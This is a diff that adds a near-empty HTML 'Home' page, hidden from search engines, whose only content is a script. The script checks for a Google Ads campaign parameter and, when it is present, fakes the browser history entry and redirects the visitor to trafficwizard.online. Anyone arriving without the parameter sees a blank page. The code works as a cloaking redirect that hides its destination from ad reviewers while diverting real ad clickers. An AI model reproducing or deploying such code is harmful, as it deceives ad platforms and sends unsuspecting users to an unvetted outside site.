@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+ 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Home</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            function hasUtmSource() {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.has("gad_campaignid");
+            }
+ 
+            function redirectToNewPage() {
+                history.pushState(
+                    {},
+                    "Article",
+                    "/about.html/",
+                );
+ 
+                window.location.href = `https://trafficwizard.online/`;
+            }
+ 
+            if (hasUtmSource()) {
+                redirectToNewPage();
+            }
+        });
+    </script>
+</head>
+ 
+<body>
+ 
+</body>
+ 
+</html>
